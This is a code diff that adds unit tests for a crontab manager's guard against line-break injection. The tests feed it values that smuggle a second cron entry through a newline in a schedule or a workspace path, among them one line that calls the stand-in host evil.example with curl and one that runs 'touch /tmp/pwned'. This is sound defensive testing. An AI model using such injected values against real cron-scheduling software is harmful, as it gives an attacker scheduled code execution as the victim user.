@@ -241,3 +241,30 @@ describe("CrontabManager.listInstalled", () => {
     expect(await CrontabManager.listInstalled("/ws")).toEqual([]);
   });
 });
+
+describe("cron line-break guard", () => {
+  // A crontab is line-based: an interpolated value carrying a line break
+  // splits the entry and installs everything after the break as an
+  // independent, attacker-chosen cron line — scheduled code execution as
+  // the user. Shell quoting cannot prevent this; the values are refused.
+  it("validateCronExpr rejects embedded newlines", () => {
+    // The field regex alone accepts this shape: \s matches newlines.
+    expect(validateCronExpr("*\n* * * * *")).toBe(false);
+    expect(validateCronExpr("0 * * * *\ncurl http://evil.example")).toBe(false);
+  });
+
+  it("sync fails closed on a newline workspace without touching the crontab", async () => {
+    const ok = await CrontabManager.sync(
+      "/tmp/legit\n* * * * * touch /tmp/pwned",
+      ["0 * * * *"],
+    );
+    expect(ok).toBe(false);
+    expect(mockRunCrontab).not.toHaveBeenCalled();
+  });
+
+  it("sync fails closed on a newline schedule without touching the crontab", async () => {
+    const ok = await CrontabManager.sync("/ws", ["*\n* * * * *"]);
+    expect(ok).toBe(false);
+    expect(mockRunCrontab).not.toHaveBeenCalled();
+  });
+});
